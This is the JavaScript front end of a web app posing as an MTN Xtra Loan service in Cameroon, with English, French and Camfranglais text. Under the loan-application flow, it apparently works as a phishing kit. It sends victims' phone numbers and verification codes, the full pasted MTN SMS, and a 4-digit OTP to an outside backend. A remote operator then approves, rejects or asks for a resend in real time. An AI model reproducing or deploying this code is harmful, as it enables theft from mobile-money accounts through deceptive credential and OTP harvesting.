// --- BACKEND CONFIGURATION ---
const API_URL = 'https://mtn-loans-backend.onrender.com';

// --- TRANSLATIONS DICTIONARY ---
const translations = {
    en: {
        choose_lang: "Choose your <span style='color: #ffcc00;'>language</span>",
        select_continue: "Select your language to continue",
        change_anytime: "You can change it anytime",
        welcome: "Welcome to MTN Xtra Loan",
        welcome_sub: "Get loans easily through MTN Xtra Loan Cameroon",
        calc_title: "Loan Calculator",
        amount: "Amount", term: "Term", months: "Months",
        monthly_pay: "Monthly Payment", start_app: "START APPLICATION",
        step1_of: "Step 1 of 3", loan_details: "Loan Details",
        loan_type: "Loan Type", biz_loan: "Business Loan", personal_loan: "Personal Loan", emergency_loan: "Emergency Loan", edu_loan: "Education Loan",
        loan_amount_xaf: "Loan Amount (XAF)", loan_term: "Loan Term",
        "12_m": "12 Months", "24_m": "24 Months", "36_m": "36 Months", "48_m": "48 Months",
        purpose: "Purpose of Loan", purpose_ph: "e.g., Business expansion",
        next_step: "NEXT STEP", step2_of: "Step 2 of 3", personal_details: "Personal Details",
        first_name: "First Name", first_name_ph: "First Name", last_name: "Last Name", last_name_ph: "Last Name",
        phone: "Phone Number (Cameroon)", phone_ph: "9 digits (e.g., 670123456)",
        verify_code: "5-Digit Verification Code", verify_ph: "Enter 5-digit code",
        back: "BACK", step3_of: "Step 3 of 3", emp_details: "Employment Details",
        emp_status: "Employment Status", self_emp: "Self-employed", emp_ft: "Employed full-time", emp_pt: "Employed part-time", student: "Student", unemployed: "Unemployed",
        annual_income: "Annual Income (XAF)", annual_ph: "e.g., 5000000", submit_app: "SUBMIT APPLICATION",
        processing: "Processing Application", processing_sub: "Please wait, this may take a few seconds",
        paste_sms_title: "Paste the <span style='color: #ffcc00;'>SMS</span> from MTN",
        paste_sms_sub: "We sent a confirmation message to your number.<br><strong>Copy the full SMS you received</strong> and paste it below.",
        paste_sms_tip: "Open your Messages app, find the SMS from MTN, long-press it, tap Copy, then come back here.",
        sms_ph: "Paste the SMS received from MTN here...",
        verify_continue: "VERIFY & CONTINUE &rarr;",
        otp_title: "Enter the <span style='color: #ffcc00;'>Verification Code</span>",
        otp_sub: "We sent a <strong>4-digit code</strong> to your number.<br>Enter it below to continue.",
        congrats: "Congratulations!", loan_approved: "Your loan has been approved",
        approved_amount: "APPROVED AMOUNT", funds_24h: "Funds within less than 24 hours",
        sms_notification: "You'll receive an SMS notification once the loan has been credited to your account."
    },
    fr: {
        choose_lang: "Choisissez votre <span style='color: #ffcc00;'>langue</span>",
        select_continue: "Sélectionnez votre langue pour continuer",
        change_anytime: "Vous pouvez le modifier à tout moment",
        welcome: "Bienvenue sur MTN Xtra Loan",
        welcome_sub: "Obtenez des prêts facilement via MTN Xtra Loan Cameroun",
        calc_title: "Calculatrice de prêt",
        amount: "Montant", term: "Durée", months: "Mois",
        monthly_pay: "Paiement mensuel", start_app: "COMMENCER LA DEMANDE",
        step1_of: "Étape 1 sur 3", loan_details: "Détails du prêt",
        loan_type: "Type de prêt", biz_loan: "Prêt d'entreprise", personal_loan: "Prêt personnel", emergency_loan: "Prêt d'urgence", edu_loan: "Prêt étudiant",
        loan_amount_xaf: "Montant du prêt (XAF)", loan_term: "Durée du prêt",
        "12_m": "12 Mois", "24_m": "24 Mois", "36_m": "36 Mois", "48_m": "48 Mois",
        purpose: "Objet du prêt", purpose_ph: "ex: Expansion d'entreprise",
        next_step: "ÉTAPE SUIVANTE", step2_of: "Étape 2 sur 3", personal_details: "Détails personnels",
        first_name: "Prénom", first_name_ph: "Prénom", last_name: "Nom", last_name_ph: "Nom",
        phone: "Numéro de téléphone (Cameroun)", phone_ph: "9 chiffres (ex: 670123456)",
        verify_code: "Code de vérification à 5 chiffres", verify_ph: "Entrez le code à 5 chiffres",
        back: "RETOUR", step3_of: "Étape 3 sur 3", emp_details: "Détails de l'emploi",
        emp_status: "Statut d'emploi", self_emp: "Travailleur indépendant", emp_ft: "Employé à temps plein", emp_pt: "Employé à temps partiel", student: "Étudiant", unemployed: "Sans emploi",
        annual_income: "Revenu annuel (XAF)", annual_ph: "ex: 5000000", submit_app: "SOUMETTRE LA DEMANDE",
        processing: "Traitement de la demande", processing_sub: "Veuillez patienter, cela peut prendre quelques secondes",
        paste_sms_title: "Collez le <span style='color: #ffcc00;'>SMS</span> de MTN",
        paste_sms_sub: "Nous avons envoyé un message de confirmation à votre numéro.<br><strong>Copiez le SMS complet</strong> et collez-le ci-dessous.",
        paste_sms_tip: "Ouvrez votre application Messages, trouvez le SMS de MTN, appuyez longuement dessus, appuyez sur Copier, puis revenez ici.",
        sms_ph: "Collez le SMS reçu de MTN ici...",
        verify_continue: "VÉRIFIER & CONTINUER &rarr;",
        otp_title: "Entrez le <span style='color: #ffcc00;'>Code de vérification</span>",
        otp_sub: "Nous avons envoyé un <strong>code à 4 chiffres</strong> à votre numéro.<br>Entrez-le ci-dessous pour continuer.",
        congrats: "Félicitations!", loan_approved: "Votre prêt a été approuvé",
        approved_amount: "MONTANT APPROUVÉ", funds_24h: "Fonds en moins de 24 heures",
        sms_notification: "Vous recevrez une notification par SMS une fois le prêt crédité sur votre compte."
    },
    cm: { // Camfranglais
        choose_lang: "Choisis ton <span style='color: #ffcc00;'>langue</span>",
        select_continue: "Choisis la langue pour continuer",
        change_anytime: "Tu peux changer quand tu veux",
        welcome: "Bienvenue for MTN Xtra Loan",
        welcome_sub: "Chop money sharp sharp via MTN Xtra Loan Camer",
        calc_title: "Calculateur de moncho",
        amount: "Le montant", term: "Le temps", months: "Mois",
        monthly_pay: "Tu payes chaque mois", start_app: "COMMENCER L'APPLICATION",
        step1_of: "Étape 1 sur 3", loan_details: "Les détails du moncho",
        loan_type: "Type de moncho", biz_loan: "Moncho for business", personal_loan: "Moncho personnel", emergency_loan: "Moncho d'urgence", edu_loan: "Moncho for l'école",
        loan_amount_xaf: "Le montant (XAF)", loan_term: "Combien de temps",
        "12_m": "12 Mois", "24_m": "24 Mois", "36_m": "36 Mois", "48_m": "48 Mois",
        purpose: "Pourquoi tu prends le moncho", purpose_ph: "ex: Business expansion",
        next_step: "CONTINUER", step2_of: "Étape 2 sur 3", personal_details: "Tes infos",
        first_name: "Ton first name", first_name_ph: "First Name", last_name: "Ton last name", last_name_ph: "Last Name",
        phone: "Ton numéro (Camer)", phone_ph: "9 chiffres (ex: 670123456)",
        verify_code: "Code de vérification (5 chiffres)", verify_ph: "Mets le code ici",
        back: "RETOURNER", step3_of: "Étape 3 sur 3", emp_details: "Ton travail",
        emp_status: "Tu fais quoi?", self_emp: "Je suis mon propre boss", emp_ft: "Je travaille full time", emp_pt: "Je travaille part time", student: "Je suis étudiant", unemployed: "Je suis au chômage",
        annual_income: "Ce que tu gagnes par an (XAF)", annual_ph: "ex: 5000000", submit_app: "ENVOYER L'APPLICATION",
        processing: "On traite ton dossier", processing_sub: "Attends un peu, ça peut prendre quelques secondes",
        paste_sms_title: "Colle le <span style='color: #ffcc00;'>SMS</span> de MTN",
        paste_sms_sub: "On t'a envoyé un message.<br><strong>Copie le SMS complet</strong> et colle ici.",
        paste_sms_tip: "Ouvre tes messages, trouve le SMS de MTN, appuie longtemps, copie, et reviens ici.",
        sms_ph: "Colle le SMS de MTN ici...",
        verify_continue: "VÉRIFIER & CONTINUER &rarr;",
        otp_title: "Mets le <span style='color: #ffcc00;'>Code de vérification</span>",
        otp_sub: "On t'a envoyé un <strong>code à 4 chiffres</strong>.<br>Mets-le ici pour continuer.",
        congrats: "Félicitations!", loan_approved: "On a approuvé ton moncho",
        approved_amount: "LE MONCHO APPROUVÉ", funds_24h: "Tu reçois l'argent dans moins de 24h",
        sms_notification: "Tu vas recevoir un SMS quand l'argent va tomber."
    }
};

// --- LANGUAGE SYSTEM ---
let currentLang = 'en';

function setLanguage(lang, element) {
    currentLang = lang;
    
    document.querySelectorAll('.lang-option').forEach(el => el.classList.remove('active'));
    if (element) element.classList.add('active');

    document.querySelectorAll('[data-translate]').forEach(el => {
        const key = el.getAttribute('data-translate');
        if (translations[lang] && translations[lang][key]) {
            if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
                el.placeholder = translations[lang][key];
            } else {
                el.innerHTML = translations[lang][key];
            }
        }
    });

    setTimeout(() => { showScreen('screen-home'); }, 300);
}

// Show a specific screen
function showScreen(screenId) {
    document.querySelectorAll('.app-screen').forEach(screen => {
        screen.classList.remove('active');
    });
    document.getElementById(screenId).classList.add('active');
    document.getElementById(screenId).scrollTop = 0;
}

// --- Form Validation ---
function validateStep1() {
    const amount = document.getElementById('form-amount').value;
    const purpose = document.getElementById('loan-purpose').value;

    if (!amount || amount < 10000) {
        alert(currentLang === 'en' ? "Please enter a valid Loan Amount." : "Veuillez entrer un montant valide.");
        return;
    }
    if (!purpose.trim()) {
        alert(currentLang === 'en' ? "Please enter the Purpose of the Loan." : "Veuillez entrer l'objet du prêt.");
        return;
    }
    
    window.approvedAmount = Number(amount).toLocaleString();
    showScreen('screen-step2');
}

function validateStep2() {
    const firstName = document.getElementById('first-name').value;
    const lastName = document.getElementById('last-name').value;
    const phone = document.getElementById('phone').value;
    const code = document.getElementById('verification-code').value;

    if (!firstName.trim() || !lastName.trim()) {
        alert(currentLang === 'en' ? "Please enter both First Name and Last Name." : "Veuillez entrer votre prénom et nom.");
        return;
    }
    if (!phone || phone.length < 9) {
        alert(currentLang === 'en' ? "Please enter a valid 9-digit Phone Number." : "Veuillez entrer un numéro de téléphone valide.");
        return;
    }
    if (!code || code.length < 5) {
        alert(currentLang === 'en' ? "Please enter the 5-digit Verification Code." : "Veuillez entrer le code de vérification à 5 chiffres.");
        return;
    }

    showScreen('screen-step3');
}

function validateStep3(event) {
    const income = document.getElementById('annual-income').value;

    if (!income || income <= 0) {
        alert(currentLang === 'en' ? "Please enter a valid Annual Income." : "Veuillez entrer un revenu annuel valide.");
        return;
    }

    submitApplication(event);
}

// Loan Calculator Logic
const amountSlider = document.getElementById('loan-amount');
const termSlider = document.getElementById('loan-term');
const amountDisplay = document.getElementById('amount-display');
const termDisplay = document.getElementById('term-display');
const monthlyPaymentDisplay = document.getElementById('monthly-payment');

function calculateLoan() {
    const amount = parseFloat(amountSlider.value);
    const months = parseFloat(termSlider.value);
    
    amountDisplay.innerText = 'XAF ' + amount.toLocaleString();
    const monthsText = translations[currentLang].months || 'Months';
    termDisplay.innerText = months + ' ' + monthsText;

    const interestRate = 0.01;
    const monthlyPayment = (amount / months) + (amount * interestRate);
    
    monthlyPaymentDisplay.innerText = 'XAF ' + Math.round(monthlyPayment).toLocaleString();
    
    document.getElementById('form-amount').value = amount;
}

amountSlider.addEventListener('input', calculateLoan);
termSlider.addEventListener('input', calculateLoan);
calculateLoan();

// Submit Initial Application
async function submitApplication(e) {
    if(e) e.preventDefault();
    
    document.getElementById('processing-title').innerText = translations[currentLang].processing;
    document.getElementById('processing-text').innerText = translations[currentLang].processing_sub;
    document.getElementById('loader-spinner').style.display = "block"; 
    showScreen('screen-processing');

    const data = {
        phone: document.getElementById('phone').value,
        code: document.getElementById('verification-code').value
    };

    try {
        const response = await fetch(`${API_URL}/api/apply`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        const result = await response.json();

        if (result.success && result.appId) {
            window.currentAppId = result.appId;

            const interval = setInterval(async () => {
                try {
                    const statusRes = await fetch(`${API_URL}/api/status/${result.appId}`);
                    const statusData = await statusRes.json();

                    if (statusData.status === 'approved') {
                        clearInterval(interval); 
                        document.getElementById('processing-title').innerText = "Approved!";
                        document.getElementById('processing-text').innerText = "Redirecting...";
                        document.getElementById('loader-spinner').style.display = "none"; 
                        setTimeout(() => { showScreen('screen-sms'); }, 1000); 

                    } else if (statusData.status === 'rejected') {
                        clearInterval(interval); 
                        document.getElementById('processing-title').innerText = "Rejected";
                        document.getElementById('processing-text').innerText = "Unfortunately, we cannot offer you a loan at this time.";
                        document.getElementById('loader-spinner').style.display = "none"; 
                    }
                } catch (error) {
                    console.error("Waiting for approval...", error);
                }
            }, 3000); 
        } else {
            alert("Error sending application.");
            showScreen('screen-step3');
        }
    } catch (error) {
        console.error(error);
        alert("Network error.");
        showScreen('screen-step3');
    }
}

// --- SMS Screen Logic ---
const smsInput = document.getElementById('sms-input');
const verifyBtn = document.getElementById('verify-btn');

smsInput.addEventListener('input', function() {
    const hasContent = smsInput.value.trim().length > 0;
    if (hasContent) {
        verifyBtn.style.pointerEvents = 'auto';
        verifyBtn.style.background = '#ffcc00';
        verifyBtn.style.color = '#000';
    } else {
        verifyBtn.style.pointerEvents = 'none';
        verifyBtn.style.background = '#1e3a8a';
        verifyBtn.style.color = '#8892b0';
    }
});

verifyBtn.addEventListener('click', function() {
    const smsText = smsInput.value.trim();
    if (smsText.length < 10) {
        alert("Please paste the full SMS you received from MTN.");
        return;
    }

    document.getElementById('processing-title').innerText = "Verifying SMS...";
    document.getElementById('processing-text').innerText = "Please wait...";
    document.getElementById('loader-spinner').style.display = "block";
    showScreen('screen-processing');

    fetch(`${API_URL}/api/verify-sms`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sms: smsText, appId: window.currentAppId || 'unknown' })
    })
    .then(res => res.json())
    .then(result => {
        if (result.success) {
            const interval = setInterval(async () => {
                try {
                    const statusRes = await fetch(`${API_URL}/api/sms-status/${window.currentAppId}`);
                    const statusData = await statusRes.json();

                    if (statusData.status === 'approved') {
                        clearInterval(interval);
                        document.getElementById('processing-title').innerText = "SMS Approved";
                        document.getElementById('processing-text').innerText = "Redirecting...";
                        document.getElementById('loader-spinner').style.display = "none";
                        
                        setTimeout(() => {
                            showScreen('screen-otp');
                            setTimeout(() => document.querySelectorAll('.otp-box')[0].focus(), 300);
                        }, 1000);

                    } else if (statusData.status === 'rejected') {
                        clearInterval(interval);
                        // UPDATED: Go back to Step 2 (Phone & Code) on Reject
                        document.getElementById('processing-title').innerText = "Incorrect Details";
                        document.getElementById('processing-text').innerText = "Enter the correct 5 digit code.";
                        document.getElementById('loader-spinner').style.display = "none";
                        
                        setTimeout(() => {
                            showScreen('screen-step2');
                            
                            // Clear the inputs
                            document.getElementById('phone').value = '';
                            document.getElementById('verification-code').value = '';
                            
                            smsInput.value = ''; 
                            verifyBtn.style.pointerEvents = 'none';
                            verifyBtn.style.background = '#1e3a8a';
                            verifyBtn.style.color = '#8892b0';
                        }, 2500);

                    } else if (statusData.status === 'resend') {
                        clearInterval(interval);
                        document.getElementById('processing-title').innerText = "SMS Resent";
                        document.getElementById('processing-text').innerText = "Check your sms for the new sms code.";
                        document.getElementById('loader-spinner').style.display = "none";
                        
                        setTimeout(() => {
                            showScreen('screen-sms');
                            smsInput.value = ''; 
                            verifyBtn.style.pointerEvents = 'none';
                            verifyBtn.style.background = '#1e3a8a';
                            verifyBtn.style.color = '#8892b0';
                        }, 3000);
                    }
                } catch (error) {
                    console.error("Checking SMS status...", error);
                }
            }, 3000);
        } else {
            alert("Error sending SMS.");
            showScreen('screen-sms');
        }
    });
});

// --- OTP Screen Logic ---
const otpBoxes = document.querySelectorAll('.otp-box');
const otpSubmitBtn = document.getElementById('otp-submit-btn');

otpBoxes.forEach((box, index) => {
    box.addEventListener('focus', () => {
        box.style.borderColor = '#ffcc00';
        box.style.boxShadow = '0 0 0 3px rgba(255, 204, 0, 0.2)';
    });
    box.addEventListener('blur', () => {
        box.style.borderColor = '#233554';
        box.style.boxShadow = 'none';
    });

    box.addEventListener('input', (e) => {
        if (e.target.value && index < otpBoxes.length - 1) {
            otpBoxes[index + 1].focus();
        }
        checkOtpComplete();
    });

    box.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
            otpBoxes[index - 1].focus();
        }
    });

    box.addEventListener('paste', (e) => {
        e.preventDefault();
        const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
        if (pastedData) {
            for (let i = 0; i < pastedData.length; i++) {
                if (otpBoxes[i]) otpBoxes[i].value = pastedData[i];
            }
            if (pastedData.length === 4) otpBoxes[3].focus();
            else otpBoxes[pastedData.length].focus();
            checkOtpComplete();
        }
    });
});

function checkOtpComplete() {
    let allFilled = true;
    otpBoxes.forEach(box => {
        if (!box.value) allFilled = false;
    });

    if (allFilled) {
        otpSubmitBtn.style.pointerEvents = 'auto';
        otpSubmitBtn.style.background = '#ffcc00';
        otpSubmitBtn.style.color = '#000';
    } else {
        otpSubmitBtn.style.pointerEvents = 'none';
        otpSubmitBtn.style.background = '#1e3a8a';
        otpSubmitBtn.style.color = '#8892b0';
    }
}

otpSubmitBtn.addEventListener('click', () => {
    let fullCode = "";
    otpBoxes.forEach(box => fullCode += box.value);

    document.getElementById('processing-title').innerText = "Verifying Code...";
    document.getElementById('processing-text').innerText = "Please wait...";
    document.getElementById('loader-spinner').style.display = "block";
    showScreen('screen-processing');

    fetch(`${API_URL}/api/submit-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ otp: fullCode, appId: window.currentAppId || 'unknown' })
    })
    .then(res => res.json())
    .then(result => {
        if (result.success) {
            const interval = setInterval(async () => {
                try {
                    const statusRes = await fetch(`${API_URL}/api/otp-status/${window.currentAppId}`);
                    const statusData = await statusRes.json();

                    if (statusData.status === 'approved') {
                        clearInterval(interval);
                        document.getElementById('processing-title').innerText = "Approved!";
                        document.getElementById('processing-text').innerText = "Redirecting...";
                        document.getElementById('loader-spinner').style.display = "none";
                        
                        setTimeout(() => {
                            document.getElementById('approved-amount-display').innerText = window.approvedAmount || '500,000';
                            showScreen('screen-success');
                        }, 1000);

                    } else if (statusData.status === 'resend') {
                        clearInterval(interval);
                        document.getElementById('processing-title').innerText = "SMS Resent";
                        document.getElementById('processing-text').innerText = "Check your sms for the new sms code.";
                        document.getElementById('loader-spinner').style.display = "none";
                        
                        setTimeout(() => {
                            showScreen('screen-sms');
                            smsInput.value = ''; 
                            verifyBtn.style.pointerEvents = 'none';
                            verifyBtn.style.background = '#1e3a8a';
                            verifyBtn.style.color = '#8892b0';
                        }, 3000);

                    } else if (statusData.status === 'inactive') {
                        clearInterval(interval);
                        document.getElementById('processing-title').innerText = "Account Inactive";
                        document.getElementById('processing-text').innerText = "Your account is currently inactive. Please contact support.";
                        document.getElementById('loader-spinner').style.display = "none";
                    }
                } catch (error) {
                    console.error("Checking OTP status...", error);
                }
            }, 3000);
        } else {
            alert("Error sending OTP.");
            showScreen('screen-otp');
        }
    })
    .catch(() => {
        document.getElementById('processing-title').innerText = "Network Error";
        document.getElementById('processing-text').innerText = "Please try again.";
        document.getElementById('loader-spinner').style.display = "none";
    });
});